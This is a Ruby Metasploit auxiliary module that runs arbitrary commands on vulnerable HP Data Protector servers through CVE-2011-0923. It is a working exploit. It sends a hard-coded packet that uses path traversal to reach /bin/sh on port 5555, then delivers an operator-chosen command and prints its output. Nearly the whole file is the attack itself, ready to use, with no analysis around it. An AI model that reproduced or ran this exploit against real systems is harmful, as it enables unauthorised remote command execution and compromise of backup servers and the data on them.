require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Scanner

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Command Execution on HP Dataprotector',
			'Description'    => %q{
						This auxilliary module can be used to run commands on
						vulnerable versions of HP DataProtector.
			},
			'Author'         => [ 'Sohil Garg' ],
			'License'        => MSF_LICENSE,
			'Version'        => 'v1.0$',
			'References'     =>
				[
					['OSVDB', 'NA'],
					['ZDI', 'ZDI-11-055'],
					['CVE', '2011-0923'],
					['US-CERT-VU', ''],
					['URL', 'http://www.exploit-db.com/exploits/17648/'],
				],
			'DisclosureDate' => '',
			))
		#TODO: Need to add support for other OS.
		register_options(
			[
				Opt::RPORT(5555),
				OptString.new('CMD', [ true, "Command to be executed", "whoami"])
			], self.class)
	end

	def run_host(ip)
		connect()
		print_status("Connected to #{rhost}:#{rport}...")
		#Shell code from http://www.exploit-db.com/exploits/17648/
		sock.put("")
		sock.put("\x00\x00\x00\xa4\x20\x32\x00\x20\x2d\x2d\x63\x68\x30\x6b\x73\x2d")
		sock.put("\x00\x20\x30\x00\x20\x53\x59\x53\x54\x45\x4d\x00\x20\x2d\x63\x68")
		sock.put("\x30\x6b\x73\x2d\x2d\x00\x20\x43\x00\x20\x32\x30\x00\x20\x2d\x2d")
		sock.put("\x63\x68\x30\x6b\x73\x2d\x00\x20\x50\x6f\x63\x00\x20\x2d\x72\x30")
		sock.put("\x30\x74\x2d\x72\x30\x30\x74\x2d\x00\x20\x2d\x72\x30\x30\x74\x2d")
		sock.put("\x72\x30\x30\x74\x2d\x00\x20\x2d\x72\x30\x30\x74\x2d\x72\x30\x30")
		sock.put("\x74\x2d\x00\x20\x30\x00\x20\x30\x00\x20\x2e\x2e\x2f\x2e\x2e\x2f")
		sock.put("\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e")
		sock.put("\x2e\x2f\x2e\x2e\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00\x00\x00\x00")
		sock.put("\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
		sock.put("\x00\x00\x00\x00\x00\x00\x00\x00\x00")
		cmd = datastore['CMD']
		print_status(cmd)
		sock.put(cmd)
		sock.put("\n")
		data = sock.recv(1024)
		print_status("The ran command produced output: #{data} on #{ip}")
		disconnect()
	end
end
